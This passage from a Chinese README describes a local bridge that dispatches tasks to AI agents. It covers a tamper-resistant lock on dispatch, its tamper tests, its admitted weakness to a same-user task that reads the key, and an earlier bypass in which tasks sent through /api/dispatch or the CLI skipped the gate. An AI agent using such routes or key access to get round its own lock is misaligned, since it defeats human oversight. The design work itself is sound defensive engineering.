签名        基于前两者 + 密钥算的（密钥 DPAPI 加密存盘）
标记        .initialized（0 字节，只表示"跑过"）
```

**实测的各种改法：**

```
只改主文件   → 影子恢复          ✅
只改影子     → 主文件恢复        ✅
两个都改     → 签名不对，按拦满   ✅
两个都删     → 标记还在，按拦满   ✅
并发猛刷     → 加锁之后不再丢     ✅
```

**定位要说清楚：这不是绝对安全。** 任务端跟桥同用户同机器，
真想拿密钥是拿得到的。它挡住的是“顺手改一下”——
从一秒钟的事变成要花功夫，而且一改就被发现。

### 闸门装在哪

**这一点比强度更需要强调：闸门不能只装在一层。**

原来只装在插件的 `send_to_computer` 入口。想着不管模型走哪条路都拦得住。

**但闸门只在那一条路上。** 直接调 `/api/dispatch`、或者走桥自己的命令行，
**都不检查围栏。**

实测撞到过：发了验证码（全站该锁死）之后，从别的路径派了一条任务，
`created 14:51:29`、`started 14:51:30`——**1 秒后就跑起来了**。

**现在检查放在 `cmd_dispatch` 本身**，所有派活入口共用这一个函数，
任何路径都拦得住。

## 已知限制

- **只在 Windows 上验证过。** Linux/macOS 应该能跑，但沙箱那部分行为不一样。
- **并发上限取决于机器，不由代码限制。** 内存不够时任务会失败，桥会识别并报"内存不足"，但不会替你排队。
- **`ask.jsonl` 不一定写得出来。** 规则里要求它卡住时写一行，实测模型经常不写，而是把失败直接写在答案里。通道留着，但不强求。
- **只用 DSH 时才依赖它的内部机制**（`DSH_PERMISSION_MODE`、`--session-id`、`--json` 事件格式）。换到自带引擎就没这个问题——两者是并行的两条路。
- **自带引擎验证过 DeepSeek 和 Kimi。** 其他兼容接口应该能用，但工具调用和参数格式各家有出入。已知 Kimi 只接受 `temperature=1`，引擎会自动去掉这个参数重发；限流按 `RPM` 自己排队。撞上别家就修。
- **并发上限是"调速"，不是"限制"。** 每套配置各填一个数字，满了排队由后台线程自动轮转。填大了不会报错，但同一个 Key 上并行太多会互相抢限流。
- **`kimi-k2.6` 免费额度只有每分钟 3 次请求。** 一个任务要好几轮，用它跑长任务会很慢。要快就用 DeepSeek 或者付费额度。
- **QQ 那一段还依赖 NapCat 和 AstrBot。** 见 [ROADMAP.md](ROADMAP.md)，这两处迟早要换。
- **反复重启 QQ 会被风控。** 实测过：一天重启十几次，账号进"禁言"状态（`Ban state forbit write req`），发不出任何消息。重启要珍惜。
- **抖音/豆包渠道注册的飞书账号会被限制。** `21001 Access denied due to platform policy`，配置全对也不通。换纯 `feishu.cn` 注册的企业账号。
- **没有鉴权** ~~这是本机工具，别暴露到公网~~ → **1.3.0 起有多层防护**：绑定写死、token、拦浏览器请求。见 [安全](#安全为什么这个接口不能上公网)。
